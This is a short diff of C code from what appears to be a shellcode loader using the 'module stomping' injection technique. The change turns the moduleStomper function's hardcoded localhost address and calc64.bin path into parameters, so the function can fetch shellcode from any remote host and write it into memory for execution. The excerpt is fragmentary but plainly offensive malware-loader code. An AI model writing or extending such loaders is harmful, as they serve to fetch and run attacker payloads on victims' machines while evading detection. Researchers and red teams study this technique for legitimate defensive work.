@@ -23,11 +23,11 @@ BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) 
     return TRUE;
 }
 
-void moduleStomper() {
+void moduleStomper(LPCWSTR url, LPCWSTR file) {
     unsigned char* payload = NULL;
     DWORD size = 0;
 
-    int result = fetchCode(L"localhost", L"/calc64.bin", 8000, &payload, &size);
+    int result = fetchCode(url, file, 8000, &payload, &size);
     if (result != 0) {
         printf("[-] Failed to fetch shellcode with error code %d\n", result);
         return;
